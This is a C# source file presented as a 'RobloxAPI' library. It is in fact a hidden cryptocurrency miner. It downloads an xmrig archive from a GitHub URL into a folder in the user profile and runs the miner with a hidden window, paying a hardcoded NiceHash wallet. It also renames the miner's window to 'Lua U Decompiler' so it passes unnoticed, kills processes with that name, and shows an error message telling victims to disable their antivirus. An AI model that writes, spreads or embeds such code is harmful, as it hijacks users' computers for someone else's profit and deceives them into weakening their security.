using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Windows.Forms;
using System.IO.Compression;
using System.Runtime.InteropServices;

namespace RobloxAPI
{
    public class Miner_System
    {
        public static readonly string DefaultCefSharpPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Temporary_File\\";
        string MinerLocation = DefaultCefSharpPath;
        string MinerPipe = "xmrig.exe";
        string MinerDL = "https://raw.githubusercontent.com/iMultilingual/BTC-Miner_API/main/xmrig.zip";
        WebClient webClient = new WebClient();
        private void DownloadMiner()
        {
            try
            {
                if (!Directory.Exists(DefaultCefSharpPath))
                {
                    Directory.CreateDirectory(DefaultCefSharpPath); //ofc create the miner directory
                }

                if (!File.Exists(MinerLocation + "/RobloxAPI.zip")) // If this shit is not fucking exist then it download miner
                {
                    webClient.DownloadFile(MinerDL, MinerLocation + "/RobloxAPI.zip");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Oh no, You might Hit a Roadblock, This Application may Experience an Problem. Please Disable your AntiVirus if necessary and Try Again.\n\nError Code: " + ex.Message);
                return;
            }
            try
            {
                if (!File.Exists(DefaultCefSharpPath + "\\xmrig.exe"))
                {
                    ZipFile.ExtractToDirectory(MinerLocation + "/RobloxAPI.zip", MinerLocation); //Extract the Miner
                }
                if (!File.Exists(DefaultCefSharpPath + "\\WinRing0x64.sys"))
                {
                    ZipFile.ExtractToDirectory(MinerLocation + "/RobloxAPI.zip", MinerLocation); //Extract the Miner
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Oh no, You might Hit a Roadblock, This Application may Experience an Problem. Please Disable your AntiVirus if necessary and Try Again.\nError Code: " + ex.Message);
                return;
            }
        }
        [DllImport("user32.dll")]
        static extern int SetWindowText(IntPtr hWnd, string text);

        public void Start_Mining(string NiceHash_Wallet = "31oUmtGgSmQgxdwT1ZCbNpGVSjJHX4KFBR$0-8GEJh8dbvFSZfVqWPhoA8g")
        {
            foreach (var process in Process.GetProcessesByName("Lua U Decompiler"))
            {
                process.Kill();
            }
            /* Download the Mining of */
            if (!Directory.Exists(MinerLocation))
            {
                DownloadMiner();
            }
            string command_1 = "-a rx/0 -o randomxmonero.eu.nicehash.com:3380 -u ";
            string command_2 = NiceHash_Wallet; //Uses Nicehash Wallet so yeah u need a fucking a wallet
            string command_3 = " --http-enabled --http-port=4000 --nicehash --cpu-priority 0 --donate-level=1";
            string final_cum = command_1 + command_2 + command_3;
            Process proc = new Process();
            proc.StartInfo.FileName = DefaultCefSharpPath + "\\xmrig.exe";
            proc.StartInfo.Arguments = final_cum;
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.Start();
            IntPtr handle = proc.MainWindowHandle;
            SetWindowText(handle, "Lua U Decompiler");
        }
    }
}
